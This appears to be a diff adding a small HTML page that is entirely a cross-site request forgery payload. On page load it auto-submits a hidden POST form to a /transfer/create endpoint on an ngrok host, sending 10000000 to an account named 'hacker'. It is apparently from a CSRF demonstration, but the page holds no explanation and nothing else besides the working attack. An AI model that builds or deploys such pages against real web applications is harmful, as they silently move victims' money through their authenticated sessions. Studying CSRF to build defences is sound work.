@@ -1,0 +1,16 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title></title>
+  </head>
+  <body onload="document.transferForm.submit()">
+    <form
+      method="POST"
+      name="transferForm"
+      action="https://3cc34f688412.ngrok.io/transfer/create"
+    >
+      <input type="text" name="accountId" value="hacker" />
+      <input type="number" name="amount" value="10000000" />
+    </form>
+  </body>
+</html>
